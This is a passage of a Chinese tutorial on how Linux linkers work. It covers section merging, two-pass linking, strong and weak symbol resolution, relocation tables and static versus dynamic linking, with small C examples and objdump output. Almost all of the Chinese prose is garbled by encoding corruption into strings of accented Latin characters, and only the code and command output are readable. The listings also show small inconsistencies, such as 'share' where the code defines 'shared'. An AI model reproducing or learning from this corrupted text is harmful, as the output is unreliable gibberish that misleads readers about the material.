ï¼‰æ–‡ä»¶ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼ˆObject Fileï¼Œä¸€èˆ¬æ‰©å±•åä¸º .o æˆ– .obj ï¼‰ã€‚ç›®æ ‡æ–‡ä»¶å’Œ åº“ï¼ˆLibraryï¼‰ ä¸€èµ·é“¾æ¥å½¢æˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å…¶ä¸­ï¼Œæœ€å¸¸è§çš„åº“å°±æ˜¯è¿è¡Œæ—¶åº“ï¼ˆRuntime Libraryï¼‰ï¼Œå®ƒæ˜¯æ”¯æŒç¨‹åºè¿è¡Œçš„åŸºæœ¬å‡½æ•°çš„é›†åˆã€‚åº“æœ¬è´¨ä¸Šæ˜¯ä¸€ç»„ç›®æ ‡æ–‡ä»¶çš„åŒ…ï¼Œç”±ä¸€äº›æœ€å¸¸ç”¨çš„ä»£ç ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶åæ‰“åŒ…è€Œæˆã€‚ é“¾æ¥è¿‡ç¨‹ä¸»è¦åŒ…å«äº†ä¸‰ä¸ªæ­¥éª¤ï¼š åœ°å€ä¸ç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ ç¬¦å·è§£æï¼ˆSymbol Resolutionï¼‰ é‡å®šä½ï¼ˆRelocationï¼‰ ä¸‹é¢ï¼Œæˆ‘ä»¬ä»¥ä¸¤ä¸ªæºä»£ç æ–‡ä»¶ a.c å’Œ b.c ä¸ºä¾‹å±•å¼€åˆ†æã€‚ // a.c extern int shared; int main() &#123; int a = 100; swap(&amp;a, &amp;shared); &#125; // b.c int shared = 1; void swap(int *a, int *b) &#123; *a ^= *b ^= *a ^= *b; &#125; å…¶ä¸­ï¼Œ b.c ä¸­å®šä¹‰äº†ä¸¤ä¸ªå…¨å±€ç¬¦å·ï¼šå˜é‡ shared ã€å‡½æ•° swap ï¼› a.c ä¸­å®šä¹‰äº†ä¸€ä¸ªå…¨å±€ç¬¦å·ï¼š main ã€‚ a.c å¼•ç”¨äº† b.c ä¸­çš„ swap å’Œ shared ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦å°†ä¸¤ä¸ªç›®æ ‡æ–‡ä»¶é“¾æ¥åœ¨ä¸€èµ·å¹¶æœ€ç»ˆå½¢æˆä¸€ä¸ªæ‰§è¡Œç¨‹æ–‡ä»¶ ab ã€‚ ä½¿ç”¨ gcc -c å‘½ä»¤æˆ‘ä»¬å¯ä»¥åˆ†åˆ«ç¼–è¯‘å¾—åˆ° a.o å’Œ b.o ä¸¤ä¸ªç›®æ ‡æ–‡ä»¶ã€‚ # åœ°å€ä¸ç©ºé—´åˆ†é… åœ¨ä»‹ç» ELF æ–‡ä»¶ç»“æ„å…³äºæ®µä¸èŠ‚çš„åŒºåˆ«æ—¶ï¼Œæˆ‘ä»¬å°±æåˆ°è¿‡å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ®µæ˜¯ç”±ç›®æ ‡æ–‡ä»¶ä¸­çš„èŠ‚åˆå¹¶è€Œæ¥çš„ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šå¯¹äºå¤šä¸ªè¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œé“¾æ¥å™¨å¦‚ä½•å°†å®ƒä»¬çš„å„ä¸ªèŠ‚åˆå¹¶åˆ°è¾“å‡ºæ–‡ä»¶å‘¢ï¼Ÿæˆ–è€…è¯´ï¼Œè¾“å‡ºæ–‡ä»¶ä¸­çš„ç©ºé—´å¦‚ä½•åˆ†é…ç»™è¾“å…¥æ–‡ä»¶ã€‚ # æŒ‰åºå åŠ  ä¸€ä¸ªæœ€ç®€å•çš„æ–¹æ¡ˆå°±æ˜¯å°†è¾“å…¥çš„æ–‡ä»¶æŒ‰åºå åŠ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ è™½ç„¶è¿™ç§æ–¹æ³•éå¸¸ç®€å•ï¼Œä½†æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šåœ¨æœ‰å¾ˆå¤šè¾“å…¥æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œè¾“å‡ºæ–‡ä»¶ä¼šæœ‰å¾ˆå¤šé›¶æ•£çš„èŠ‚ã€‚è¿™ç§åšæ³•éå¸¸æµªè´¹ç©ºé—´ï¼Œå› ä¸ºæ¯ä¸ªèŠ‚éƒ½éœ€è¦æœ‰ä¸€å®šçš„åœ°å€å’Œç©ºé—´å¯¹é½è¦æ±‚ã€‚x86 ç¡¬ä»¶çš„å¯¹é½è¦æ±‚æ˜¯ 4KBã€‚å¦‚æœä¸€ä¸ªèŠ‚çš„å¤§å°åªæœ‰ 1 ä¸ªå­—èŠ‚ï¼Œå®ƒä¹Ÿè¦åœ¨å†…å­˜åœ¨é‡ç”¨ 4KBã€‚è¿™æ ·ä¼šé€ æˆå¤§é‡å†…éƒ¨ç¢ç‰‡ã€‚æ‰€ä»¥ä¸æ˜¯ä¸€ä¸ªå¥½çš„æ–¹æ¡ˆã€‚ # åˆå¹¶ç›¸ä¼¼èŠ‚ ä¸€ä¸ªæ›´åŠ å®é™…çš„æ–¹æ³•ä¾¿æ˜¯åˆå¹¶ç›¸åŒæ€§è´¨çš„èŠ‚ï¼Œæ¯”å¦‚ï¼šå°†æ‰€æœ‰è¾“å…¥æ–‡ä»¶çš„ .text èŠ‚åˆå¹¶åˆ°è¾“å‡ºæ–‡ä»¶çš„ text æ®µï¼ˆæ³¨æ„ï¼Œæ­¤æ—¶å‡ºç°äº†æ®µå’ŒèŠ‚ä¸¤ä¸ªæ¦‚å¿µï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å…¶ä¸­ .bss èŠ‚åœ¨ç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¸å ç”¨æ–‡ä»¶çš„ç©ºé—´ï¼Œä½†æ˜¯å®ƒåœ¨è£…è½½æ—¶å ç”¨åœ°å€ç©ºé—´ã€‚äº‹å®ä¸Šï¼Œè¿™é‡Œçš„ç©ºé—´å’Œåœ°å€æœ‰ä¸¤å±‚å«ä¹‰: åœ¨è¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç©ºé—´ åœ¨è£…è½½åçš„è™šæ‹Ÿåœ°å€ä¸­çš„ç©ºé—´ å¯¹äºæœ‰å®é™…æ•°æ®çš„èŠ‚ï¼Œå¦‚ .text å’Œ .data ï¼Œå®ƒä»¬åœ¨æ–‡ä»¶ä¸­å’Œè™šæ‹Ÿåœ°å€ä¸­éƒ½è¦åˆ†é…ç©ºé—´ï¼Œå› ä¸ºå®ƒä»¬åœ¨è¿™ä¸¤è€…ä¸­éƒ½å­˜åœ¨ï¼›å¯¹äº .bss æ¥ï¼Œåˆ†é…ç©ºé—´çš„æ„ä¹‰åªå±€é™äºè™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå› ä¸ºå®ƒåœ¨æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰å†…å®¹ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œè°ˆåˆ°çš„ç©ºé—´åˆ†é…åªå…³æ³¨äºè™šæ‹Ÿåœ°å€ç©ºé—´çš„åˆ†é…ï¼Œå› ä¸ºè¿™å…³ç³»åˆ°é“¾æ¥å™¨åé¢çš„å…³äºåœ°å€è®¡ç®—çš„æ­¥éª¤ï¼Œè€Œå¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«çš„ç©ºé—´åˆ†é…ä¸é“¾æ¥çš„å…³ç³»å¹¶ä¸å¤§ã€‚ ç°åœ¨çš„é“¾æ¥å™¨ç©ºé—´åˆ†é…çš„ç­–ç•¥åŸºæœ¬ä¸Šéƒ½é‡‡ç”¨ â€œåˆå¹¶ç›¸ä¼¼èŠ‚â€ çš„æ–¹æ³•ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•çš„é“¾æ¥å™¨ä¸€èˆ¬é‡‡ç”¨ä¸€ç§å« ä¸¤æ­¥é“¾æ¥ï¼ˆTwo-pass Linkingï¼‰ çš„æ–¹æ³•ã€‚å³æ•´ä¸ªé“¾æ¥è¿‡ç¨‹åˆ†ä¸ºä¸¤æ­¥ï¼š ç¬¬ä¸€æ­¥ åœ°å€ä¸ç©ºé—´åˆ†é… æ‰«ææ‰€æœ‰çš„è¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œè·å¾—å®ƒä»¬çš„å„ä¸ªèŠ‚çš„é•¿åº¦ã€å±æ€§ã€ä½ç½®ï¼Œå¹¶å°†è¾“å…¥ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ä¸­æ‰€æœ‰çš„ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨æ”¶é›†èµ·æ¥ï¼Œç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªå…¨å±€çš„ç¬¦å·è¡¨ã€‚è¿™ä¸€æ­¥ï¼Œé“¾æ¥å™¨èƒ½å¤Ÿè·å¾—æ‰€æœ‰è¾“å…¥ç›®æ ‡æ–‡ä»¶çš„èŠ‚çš„é•¿åº¦ï¼Œå¹¶å°†å®ƒä»¬åˆå¹¶ï¼Œè®¡ç®—å‡ºè¾“å‡ºæ–‡ä»¶ä¸­å„ä¸ªèŠ‚åˆå¹¶åçš„é•¿åº¦ä¸ä½ç½®ï¼Œå¹¶å»ºç«‹æ˜ å°„å…³ç³»ã€‚ ç¬¬äºŒæ­¥ ç¬¦å·è§£æä¸é‡å®šä½ ä½¿ç”¨å‰ä¸€æ­¥ä¸­æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¯»å–è¾“å…¥æ–‡ä»¶ä¸­èŠ‚çš„è¾“æ•°æ®ã€é‡å®šä½ä¿¡æ¯ï¼Œå¹¶ä¸”è¿›è¡Œç¬¦å·è§£æä¸é‡å®šä½ã€è°ƒæ•´ä»£ç ã€è°ƒæ•´ä»£ç ä¸­çš„åœ°å€ç­‰ã€‚äº‹å®ä¸Šï¼Œç¬¬äºŒæ­¥æ˜¯é“¾æ¥è¿‡ç¨‹çš„æ ¸å¿ƒï¼Œå°¤å…¶æ˜¯é‡å®šä½ã€‚ åœ¨åœ°å€ä¸ç©ºé—´åˆ†é…æ­¥éª¤å®Œæˆä¹‹åï¼Œç›¸ä¼¼æƒé™çš„èŠ‚ä¼šè¢«åˆå¹¶æˆæ®µï¼Œå¹¶ç”Ÿæˆäº† ELF æ–‡ä»¶ç»“æ„ä¸€æ–‡ä¸­æ²¡æœ‰ä»‹ç»çš„ ç¨‹åºå¤´è¡¨ï¼ˆProgram Header Tableï¼‰ ç»“æ„ã€‚å¦‚ä¸‹å³å›¾å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„æ‰€ç¤ºï¼Œä¸»è¦ç”Ÿæˆä¸¤ä¸ªæ®µï¼šä»£ç æ®µï¼ˆ text æ®µï¼‰ã€æ•°æ®æ®µï¼ˆ data æ®µ ï¼‰ã€‚ æˆ‘ä»¬ä½¿ç”¨ ld æˆ– gcc å°† a.o å’Œ b.o é“¾æ¥èµ·æ¥ï¼Œç„¶åä½¿ç”¨ objdump å·¥å…·æ¥æŸ¥çœ‹é“¾æ¥å‰åçš„åœ°å€åˆ†é…æƒ…å†µã€‚ $ objdump -h a.o Sections: Idx Name Size VMA LMA File off Algn 0 .text 0000004f 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE 1 .data 00000000 0000000000000000 0000000000000000 0000008f 2**0 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 0000000000000000 0000000000000000 0000008f 2**0 ALLOC ... $ objdump -h b.o Sections: Idx Name Size VMA LMA File off Algn 0 .text 0000004b 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, READONLY, CODE 1 .data 00000004 0000000000000000 0000000000000000 0000008c 2**2 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 0000000000000000 0000000000000000 00000090 2**0 ALLOC ... $ objdump -h ab Sections: Idx Name Size VMA LMA File off Algn ... 13 .text 00000202 0000000000400450 0000000000400450 00000450 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE ... 24 .data 00000014 0000000000601028 0000000000601028 00001028 2**3 CONTENTS, ALLOC, LOAD, DATA 25 .bss 00000004 000000000060103c 000000000060103c 0000103c 2**0 ALLOC ... å¯ä»¥å‘ç°ï¼Œé“¾æ¥å‰ç›®æ ‡æ–‡ä»¶ä¸­æ‰€æœ‰èŠ‚çš„ VMAï¼ˆVirtual Memory Addressï¼‰ éƒ½æ˜¯ 0ï¼Œå› ä¸ºè™šæ‹Ÿç©ºé—´è¿˜æ²¡æœ‰åˆ†é…ã€‚é“¾æ¥åï¼Œå¯æ‰§è¡Œæ–‡ä»¶ ab ä¸­å„ä¸ªèŠ‚è¢«åˆ†é…åˆ°äº†ç›¸åº”çš„è™šæ‹Ÿåœ°å€ï¼Œå¦‚ .text èŠ‚è¢«åˆ†é…åˆ°äº†åœ°å€ 0x0000000000400450 ã€‚ é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆé“¾æ¥å™¨è¦å°†å¯æ‰§è¡Œæ–‡ä»¶ ab çš„ .text èŠ‚åˆ†é…åˆ° 0x0000000000400450 ï¼Ÿè€Œä¸æ˜¯ä»è™šæ‹Ÿç©ºé—´çš„ 0 åœ°å€å¼€å§‹åˆ†é…å‘¢ï¼Ÿè¿™æ¶‰åŠåˆ°æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„åˆ†é…è§„åˆ™ã€‚åœ¨ Linux x86-64 ç³»ç»Ÿä¸­ï¼Œä»£ç æ®µæ€»æ˜¯ä» 0x0000000000400000 å¼€å§‹çš„ï¼Œå¦å¤– .text èŠ‚ä¹‹å‰è¿˜æœ‰ ELF Header ã€ Program Header Table ã€ .init ç­‰å ç”¨äº†ä¸€å®šçš„ç©ºé—´ï¼Œæ‰€ä»¥å°±è¢«åˆ†é…åˆ°äº† 0x0000000000400450 ã€‚ # ç¬¦å·è§£æ åœ¨ä¸¤æ­¥é“¾æ¥ä¸­ï¼Œè¿™ä¸€æ­¥å’Œé‡å®šä½è¢«åˆå¹¶æˆäº†ä¸€æ­¥ï¼Œè¿™æ˜¯å› ä¸ºé‡å®šä½çš„è¿‡ç¨‹æ˜¯ä¼´éšç€ç¬¦å·è§£æçš„ã€‚è¿™é‡Œæˆ‘ä»¬åˆ†å¼€ä»‹ç»ã€‚ é“¾æ¥å™¨è§£æç¬¦å·å¼•ç”¨çš„æ–¹æ³•æ˜¯å°†æ¯ä¸ªå¼•ç”¨ä¸å®ƒè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚å¯¹é‚£äº›å’Œå¼•ç”¨å®šä¹‰åœ¨ç›¸åŒæ¨¡å—çš„å±€éƒ¨ç¬¦å·çš„å¼•ç”¨ï¼Œç¬¦å·è§£ææ˜¯éå¸¸ç®€å•çš„ã€‚ç¼–è¯‘å™¨åªå…è®¸æ¯ä¸ªæ¨¡å—ä¸­æ¯ä¸ªå±€éƒ¨ç¬¦å·æœ‰ä¸€ä¸ªå®šä¹‰ã€‚é™æ€å±€éƒ¨å˜é‡ä¹Ÿä¼šæœ‰æœ¬åœ°é“¾æ¥å™¨ç¬¦å·ï¼Œç¼–è¯‘å™¨è¿˜è¦ç¡®ä¿å®ƒä»¬æ‹¥æœ‰å”¯ä¸€çš„åå­—ã€‚ ç„¶è€Œï¼Œå¯¹äºå…¨å±€ç¬¦å·çš„è§£æè¦å¤æ‚å¾—å¤šã€‚å½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªä¸æ˜¯åœ¨å½“å‰æ¨¡å—ä¸­å®šä¹‰çš„ç¬¦å·ï¼ˆå˜é‡æˆ–å‡½æ•°åï¼‰æ—¶ï¼Œä¼šå‡è®¾è¯¥ç¬¦å·æ˜¯åœ¨å…¶ä»–æŸä¸ªæ¨¡å—ä¸­å®šä¹‰çš„ï¼Œç”Ÿæˆä¸€ä¸ªé“¾æ¥å™¨ç¬¦å·è¡¨æ¡ç›®ï¼Œå¹¶æŠŠå®ƒäº¤ç»™é“¾æ¥å™¨å¤„ç†ã€‚å¦‚æœé“¾æ¥å™¨åœ¨å®ƒçš„ä»»ä½•è¾“å…¥æ¨¡å—ä¸­éƒ½æ‰¾ä¸åˆ°è¿™ä¸ªè¢«å¼•ç”¨ç¬¦å·çš„å®šä¹‰ï¼Œå°±è¾“å‡ºä¸€æ¡é”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¯¹å…¨å±€ç¬¦å·çš„è§£æï¼Œç»å¸¸ä¼šé¢ä¸´å¤šä¸ªç›®æ ‡æ–‡ä»¶å¯èƒ½ä¼šå®šä¹‰ç›¸åŒåå­—çš„å…¨å±€ç¬¦å·ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œé“¾æ¥å™¨å¿…é¡»è¦ä¹ˆæ ‡å¿—ä¸€ä¸ªé”™è¯¯ï¼Œè¦ä¹ˆä»¥æŸç§æ–¹æ³•é€‰å‡ºä¸€ä¸ªå®šä¹‰å¹¶æŠ›å¼ƒå…¶ä»–å®šä¹‰ã€‚ # å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·è§£æ é“¾æ¥å™¨çš„è¾“å…¥æ˜¯ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ¨¡å—ã€‚æ¯ä¸ªæ¨¡å—å®šä¹‰ä¸€ç»„ç¬¦å·ï¼Œæœ‰äº›æ˜¯å±€éƒ¨ç¬¦å·ï¼ˆåªå¯¹å®šä¹‰è¯¥ç¬¦å·çš„æ¨¡å—å¯è§ï¼‰ï¼Œæœ‰äº›æ˜¯å…¨å±€ç¬¦å·ï¼ˆå¯¹å…¶ä»–æ¨¡å—ä¹Ÿå¯è§ï¼‰ã€‚å¦‚æœå¤šä¸ªæ¨¡å—å®šä¹‰åŒåçš„å…¨å±€ç¬¦å·ï¼Œè¯¥å¦‚ä½•è¿›è¡Œå–èˆï¼Ÿ Linux ç¼–è¯‘ç³»ç»Ÿé‡‡ç”¨å¦‚ä¸‹çš„æ–¹æ³•è§£å†³å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·è§£æï¼š åœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨æƒ³æ±‡ç¼–å™¨è¾“å‡ºæ¯ä¸ªå…¨å±€ç¬¦å·ï¼Œæˆ–è€…æ˜¯å¼ºï¼ˆstrongï¼‰æˆ–è€…æ˜¯å¼±ï¼ˆweakï¼‰ï¼Œè€Œæ±‡ç¼–å™¨æŠŠè¿™ä¸ªä¿¡æ¯éšå«åœ°ç¼–ç åœ¨å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­ã€‚ æ ¹æ®å¼ºå¼±ç¬¦å·çš„å®šä¹‰ï¼ŒLinux é“¾æ¥å™¨ä½¿ç”¨ä¸‹é¢çš„è§„åˆ™æ¥å¤„ç†å¤šé‡å®šä¹‰çš„ç¬¦å·åï¼š è§„åˆ™ 1ï¼šä¸å…è®¸æœ‰å¤šä¸ªåŒåçš„å¼ºç¬¦å·ã€‚ è§„åˆ™ 2ï¼šå¦‚æœæœ‰ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·åŒåï¼Œåˆ™é€‰æ‹©å¼ºç¬¦å·ã€‚ è§„åˆ™ 3ï¼šå¦‚æœæœ‰å¤šä¸ªå¼±ç¬¦å·åŒåï¼Œåˆ™ä»è¿™äº›å¼±ç¬¦å·ä¸­ä»»æ„é€‰æ‹©ä¸€ä¸ªã€‚ å¦ä¸€æ–¹é¢ï¼Œç”±äºå…è®¸ä¸€ä¸ªç¬¦å·å®šä¹‰åœ¨å¤šä¸ªæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœä¸€ä¸ªå¼±ç¬¦å·å®šä¹‰åœ¨å¤šä¸ªç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè€Œå®ƒä»¬çš„ç±»å‹ä¸åŒï¼Œæ€ä¹ˆåŠï¼Ÿè¿™ç§æƒ…å†µä¸»è¦æœ‰ä¸‰ç§ï¼š æƒ…å†µ 1ï¼šä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å¼ºç¬¦å·ç±»å‹ä¸ä¸€è‡´ã€‚ æƒ…å†µ 2ï¼šæœ‰ä¸€ä¸ªå¼ºç¬¦å·ï¼Œå…¶ä»–éƒ½æ˜¯å¼±ç¬¦å·ï¼Œå‡ºç°ç±»å‹ä¸ä¸€è‡´ã€‚ æƒ…å†µ 3ï¼šä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šå¼±ç¬¦å·ç±»å‹ä¸ä¸€è‡´ã€‚ å…¶ä¸­ï¼Œæƒ…å†µ 1 ç”±äºå¤šä¸ªå¼ºç¬¦å·å®šä¹‰æœ¬èº«å°±æ˜¯éæ³•çš„ï¼Œæ‰€ä»¥é“¾æ¥å™¨å°±ä¼šæŠ¥é”™ã€‚å¯¹äºåä¸¤ç§æƒ…å†µï¼Œç¼–è¯‘å™¨å’Œé“¾æ¥å™¨é‡‡ç”¨ä¸€ç§å« COMMON å—ï¼ˆCommon Block ï¼‰ çš„æœºåˆ¶æ¥å¤„ç†ã€‚å…¶è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆï¼Œç¼–è¯‘å™¨å°†æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å®šä¹‰ä¸ºå¼±ç¬¦å·å¤„ç†ã€‚å¯¹äºæƒ…å†µ 3ï¼Œæœ€ç»ˆé“¾æ¥æ—¶é€‰æ‹©æœ€å¤§çš„ç±»å‹ã€‚å¯¹äºæƒ…å†µ 2ï¼Œæœ€ç»ˆè¾“å‡ºç»“æœä¸­çš„ç¬¦å·æ‰€å ç©ºé—´ä¸å¼ºç¬¦å·ç›¸åŒï¼Œå¦‚æœé“¾æ¥è¿‡ç¨‹ä¸­æœ‰å¼±ç¬¦å·å¤§äºå¼ºç¬¦å·ï¼Œé“¾æ¥å™¨ä¼šå‘å‡ºè­¦å‘Šã€‚ # é‡å®šä½ äº‹å®ä¸Šï¼Œé‡å®šä½è¿‡ç¨‹ä¹Ÿä¼´éšç€ç¬¦å·çš„è§£æè¿‡ç¨‹ã€‚é“¾æ¥çš„å‰ä¸¤æ­¥å®Œæˆä¹‹åï¼Œé“¾æ¥å™¨å°±å·²ç»ç¡®å®šæ‰€æœ‰ç¬¦å·çš„è™šæ‹Ÿåœ°å€äº†ï¼Œé‚£ä¹ˆé“¾æ¥å™¨å°±å¯ä»¥æ ¹æ®ç¬¦å·çš„åœ°å€å¯¹æ¯ä¸ªéœ€è¦é‡å®šä½çš„æŒ‡ä»¤è¿›è¡Œåœ°å€ä¿®æ­£ã€‚ é‚£ä¹ˆé“¾æ¥å™¨å¦‚ä½•çŸ¥é“å“ªäº›æŒ‡ä»¤æ˜¯è¦è¢«è°ƒæ•´çš„å‘¢ï¼Ÿäº‹å®ä¸Šï¼Œæˆ‘ä»¬å‰é¢æåˆ°çš„ ELF æ–‡ä»¶ä¸­çš„ é‡å®šä½è¡¨ï¼ˆRelocation Tableï¼‰ ä¸“é—¨ç”¨æ¥ä¿å­˜è¿™äº›ä¸é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ã€‚ å¯¹äºå¯é‡å®šä½çš„ ELF æ–‡ä»¶æ¥è¯´ï¼Œå®ƒå¿…é¡»åŒ…å«é‡å®šä½è¡¨ï¼Œç”¨æ¥æè¿°å¦‚ä½•ä¿®æ”¹ç›¸åº”çš„èŠ‚çš„å†…å®¹ã€‚å¯¹äºæ¯ä¸ªè¦è¢«é‡å®šä½çš„ ELF èŠ‚éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„é‡å®šä½è¡¨ã€‚å¦‚æœ .text èŠ‚éœ€è¦è¢«é‡å®šä½ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”å« .rel.text çš„èŠ‚ä¿å­˜äº†ä»£ç èŠ‚çš„é‡å®šä½è¡¨ï¼›å¦‚æœ .data èŠ‚éœ€è¦è¢«é‡å®šä½ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”çš„ .rel.tdata çš„èŠ‚ä¿å­˜äº†æ•°æ®èŠ‚çš„é‡å®šä½è¡¨ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ objdump å·¥å…·æ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶ä¸­çš„é‡å®šä½è¡¨ï¼š $ objdump -r a.o a.o: file format elf64-x86-64 RELOCATION RECORDS FOR [.text]: OFFSET TYPE VALUE 0000000000000023 R_X86_64_32 share 0000000000000030 R_X86_64_PC32 swap-0x0000000000000004 0000000000000049 R_X86_64_PC32 __stack_chk_fail-0x0000000000000004 RELOCATION RECORDS FOR [.eh_frame]: OFFSET TYPE VALUE 0000000000000020 R_X86_64_PC32 .text æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯ä¸ªè¦è¢«é‡å®šä½çš„åœ°æ–¹æ˜¯ä¸€ä¸ª é‡å®šä½å…¥å£ï¼ˆRelocation Entryï¼‰ã€‚åˆ©ç”¨æ•°æ®ç»“æ„æˆå‘˜åŒ…å«çš„ä¿¡æ¯ï¼Œå³å¯å®Œæˆé‡å®šä½ã€‚ # é™æ€é“¾æ¥ äº‹å®ä¸Šï¼Œé™æ€é“¾æ¥çš„è¿‡ç¨‹å°±æ˜¯ä¸Šæ–‡æ‰€æè¿°çš„è¿‡ç¨‹ã€‚åœ¨ Linux ä¸­ï¼Œé™æ€é“¾æ¥å™¨ï¼ˆstatic linkerï¼‰ ld ä»¥ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„ã€å¯ä»¥åŠ è½½å’Œè¿è¡Œçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å‡ºã€‚è¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ç”±å„ç§ä¸åŒçš„èŠ‚ç»„æˆï¼Œæ¯ä¸€èŠ‚éƒ½æ˜¯ä¸€ä¸ªè¿ç»­çš„å­—èŠ‚åºåˆ—ã€‚ # åŠ¨æ€é“¾æ¥ é™æ€é“¾æ¥ä½¿å¾—è¿›è¡Œæ¨¡å—åŒ–å¼€å‘ï¼Œå¤§å¤§æä¾›äº†ç¨‹åºçš„å¼€å‘æ•ˆç‡ã€‚éšç€ï¼Œç¨‹åºè§„æ¨¡çš„æ‰©å¤§ï¼Œé™æ€é“¾æ¥çš„è¯¸å¤šç¼ºç‚¹ä¹Ÿé€æ¸æš´éœ²å‡ºæ¥ï¼Œå¦‚ï¼šæµªè´¹å†…å­˜å’Œç£ç›˜ç©ºé—´ã€æ¨¡å—æ›´æ–°å›°éš¾ç­‰ã€‚åœ¨é™æ€é“¾æ¥ä¸­ï¼ŒC è¯­è¨€é™æ€åº“æ˜¯å¾ˆå…¸å‹çš„æµªè´¹ç©ºé—´çš„ä¾‹å­ã€‚å…³äºæ¨¡å—æ›´æ–°ï¼Œé™æ€é“¾æ¥çš„ç¨‹åºæœ‰ä»»ä½•æ›´æ–°ï¼Œéƒ½å¿…é¡»é‡æ–°ç¼–è¯‘é“¾æ¥ï¼Œç”¨æˆ·åˆ™éœ€è¦é‡æ–°ä¸‹è½½å®‰è£…è¯¥ç¨‹åºã€‚ è§£å†³ç©ºé—´æµªè´¹å’Œæ›´æ–°å›°éš¾æœ€ç®€å•çš„æ–¹æ³•ä¾¿æ˜¯å°†ç¨‹åºçš„æ¨¡å—ç›¸äº’åˆ†å‰²å¼€æ¥ï¼Œå½¢æˆç‹¬ç«‹æ–‡ä»¶ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ä¸å¯¹é‚£äº›ç»„æˆç¨‹åºçš„ç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥ï¼Œè€Œæ˜¯ç­‰åˆ°ç¨‹åºè¦è¿è¡Œæ—¶æ‰è¿›è¡Œé“¾æ¥ã€‚ # åŠ¨æ€é“¾æ¥çš„åŸºæœ¬å®ç° åŠ¨æ€é“¾æ¥æ¶‰åŠè¿è¡Œæ—¶çš„é“¾æ¥ä»¥åŠå¤šä¸ªæ–‡ä»¶çš„è£…è½½ï¼Œå¿…éœ€è¦æœ‰æ“ä½œç³»ç»Ÿçš„æ”¯æŒã€‚å› 